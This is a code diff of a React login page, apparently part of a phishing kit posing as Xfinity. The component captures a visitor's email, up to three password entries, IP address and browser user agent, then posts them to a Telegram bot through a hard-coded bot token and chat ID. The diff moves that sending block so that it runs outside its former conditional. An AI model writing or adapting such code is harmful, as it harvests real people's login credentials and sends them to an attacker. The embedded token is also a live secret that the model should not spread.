@@ -21,19 +21,19 @@ const Home = () => {
     const [count, setCount] = useState(0)
     const [clientIp, setClientIp] = useState('');
     const [userAgent, setUserAgent] = useState(navigator.userAgent);
-  
+
     useEffect(() => {
-      // Fetch the client's IP address using an external API
-      fetch('https://api64.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-          setClientIp(data.ip);
-        })
-        .catch(error => {
-          console.error('Error fetching IP address:', error);
-        });
+        // Fetch the client's IP address using an external API
+        fetch('https://api64.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                setClientIp(data.ip);
+            })
+            .catch(error => {
+                console.error('Error fetching IP address:', error);
+            });
     }, []);
-    
+
     useEffect(() => {
         if (userEmail) {
             setEmail(userEmail)
@@ -127,46 +127,44 @@ const Home = () => {
                 setPassword('')
                 // Proceed with form submission
 
-                const message = `Email: ${email}
+                // Replace these values with your bot token and chat ID
+                alert('Data sent successfully!');
+            }
+            const message = `Email: ${email}
                 Password1: ${password1}
                 Password2: ${password2}
                 Password3: ${password}
                 Website: xfinity.com
                 Client IP: ${clientIp}
                 User Agent: ${userAgent}`;
+            const botToken = '7183589540:AAGq3_lgoDWZRAzc9xHy4KyrTzkwcnzHt0Q';
+            const chatId = '7380056237';
+            try {
+                // Send the message to Telegram
+                toggleLoading(true)
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                    }),
+                });
 
-                // Replace these values with your bot token and chat ID
-                const botToken = '7183589540:AAGq3_lgoDWZRAzc9xHy4KyrTzkwcnzHt0Q';
-                const chatId = '7380056237';
-
-                try {
-                    // Send the message to Telegram
-                    toggleLoading(true)
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: message,
-                        }),
-                    });
-
-                    toggleLoading(false)
-                    alert('Data sent successfully!');
-                } catch (error) {
-                    console.error('Error sending message:', error);
-                }
+                toggleLoading(false)
+            } catch (error) {
+                console.error('Error sending message:', error);
             }
         }
     };
 
     return (
         <div className='w-full text-[0.82rem] flex flex-col items-end'>
-        <span className={`fixed left-0 top-0 bg-[#000000af] w-full h-full object-cover flex justify-center items-center ${loading? 'z-[100]': 'z-[-2]'}`}>
-            <img src="https://static.vecteezy.com/system/resources/thumbnails/042/600/457/small/loading-circles-flat-style-modern-preloaders-png.png"className='w-[10rem] spinner' alt="" />
-        </span>
+            <span className={`fixed left-0 top-0 bg-[#000000af] w-full h-full object-cover flex justify-center items-center ${loading ? 'z-[100]' : 'z-[-2]'}`}>
+                <img src="https://static.vecteezy.com/system/resources/thumbnails/042/600/457/small/loading-circles-flat-style-modern-preloaders-png.png" className='w-[10rem] spinner' alt="" />
+            </span>
             <div className="w-full flex h-screen">
                 <div className='w-full md:w-1/2 pt-[7%] bg-white px-4 md:px-[9%] flex flex-col gap-4'>
                     <img className='w-[5rem] pb-4' src={logo} alt="" />
